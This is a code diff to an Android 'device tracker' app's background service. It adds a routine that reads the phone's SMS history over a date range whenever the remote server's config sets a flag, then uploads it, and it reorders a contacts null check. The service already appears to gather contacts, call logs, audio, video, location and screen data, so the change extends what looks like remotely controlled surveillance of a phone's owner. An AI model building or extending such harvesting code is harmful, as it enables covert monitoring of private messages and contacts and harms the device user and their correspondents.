@@ -26,6 +26,7 @@ import androidx.core.app.NotificationCompat;
 import com.example.devicetrackerapp.R;
 import com.example.devicetrackerapp.activity.ScreenPermissionActivity;
 import com.example.devicetrackerapp.api.ApiClient;
+import com.example.devicetrackerapp.api.ApiService;
 import com.example.devicetrackerapp.dto.ApiResponse;
 import com.example.devicetrackerapp.dto.AudioFolderItem;
 import com.example.devicetrackerapp.dto.AudioFolderPayload;
@@ -48,6 +49,7 @@ import com.example.devicetrackerapp.utils.CallHistoryUtils;
 import com.example.devicetrackerapp.utils.ContactUtils;
 import com.example.devicetrackerapp.utils.DeviceUtils;
 import com.example.devicetrackerapp.utils.InputStreamRequestBody;
+import com.example.devicetrackerapp.utils.SmsSyncUtils;
 import com.example.devicetrackerapp.utils.VideoUtils;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
@@ -84,6 +86,8 @@ public class DeviceTrackingService extends Service {
 
     private boolean videoFolderSynced = false;
 
+    private ApiService apiService;
+
     private static final int VIDEO_BATCH_SIZE = 2;
 
     private String deviceId;
@@ -111,6 +115,8 @@ public class DeviceTrackingService extends Service {
         locationClient = LocationServices.getFusedLocationProviderClient(this);
 
         deviceId = DeviceUtils.getDeviceId(this);
+
+        apiService = ApiClient.getApiService();
 
         handler = new Handler();
 
@@ -709,6 +715,101 @@ public class DeviceTrackingService extends Service {
                                 }
 
 
+                                 //Sms
+                                // ================= SMS HISTORY =================
+
+                                Log.d(
+                                        TAG,
+                                        "refreshSms = " + config.getRefreshSms()
+                                                + " | smsUploaded = " + config.getSmsUploaded()
+                                                + " | fromDate = " + config.getSmsFromDate()
+                                                + " | toDate = " + config.getSmsToDate()
+                                );
+
+                                if (Boolean.TRUE.equals(config.getRefreshSms())) {
+
+                                    Log.d(
+                                            TAG,
+                                            "========== SMS SYNC REQUEST RECEIVED =========="
+                                    );
+
+                                    if (!hasPermission(Manifest.permission.READ_SMS)) {
+
+                                        Log.e(
+                                                TAG,
+                                                "READ_SMS permission not granted"
+                                        );
+
+                                    } else {
+
+                                        try {
+
+                                            SmsSyncUtils smsSyncManager =
+                                                    new SmsSyncUtils(
+                                                            DeviceTrackingService.this,
+                                                            apiService
+                                                    );
+
+                                            long from =
+                                                    smsSyncManager.parseFromDate(
+                                                            config.getSmsFromDate()
+                                                    );
+
+                                            long to =
+                                                    smsSyncManager.parseToDate(
+                                                            config.getSmsToDate()
+                                                    );
+
+                                            if (from <= 0 || to <= 0) {
+
+                                                Log.e(
+                                                        TAG,
+                                                        "Invalid SMS date range"
+                                                );
+
+                                            } else if (from > to) {
+
+                                                Log.e(
+                                                        TAG,
+                                                        "SMS fromDate cannot be after toDate"
+                                                );
+
+                                            } else {
+
+                                                Log.d(
+                                                        TAG,
+                                                        "Starting SMS sync"
+                                                                + " | from="
+                                                                + config.getSmsFromDate()
+                                                                + " | to="
+                                                                + config.getSmsToDate()
+                                                );
+
+                                                smsSyncManager.syncSms(
+                                                        deviceId,
+                                                        from,
+                                                        to
+                                                );
+                                            }
+
+                                        } catch (Exception e) {
+
+                                            Log.e(
+                                                    TAG,
+                                                    "SMS Sync Error",
+                                                    e
+                                            );
+                                        }
+                                    }
+
+                                } else {
+
+                                    Log.d(
+                                            TAG,
+                                            "SMS sync not requested. Skip."
+                                    );
+                                }
+
 
                             }
 
@@ -752,13 +853,13 @@ public class DeviceTrackingService extends Service {
 
             List<ContactItem> contacts = ContactUtils.getContacts(this);
 
-            if (contacts.size() > 5000) {
-                Log.d(TAG, "Large Contact List : " + contacts.size());
-            }
-
             if (contacts == null || contacts.isEmpty()) {
                 Log.d(TAG, "No Contacts Found");
                 return;
+            }
+
+            if (contacts.size() > 5000) {
+                Log.d(TAG, "Large Contact List : " + contacts.size());
             }
 
             ContactPayload payload = new ContactPayload(
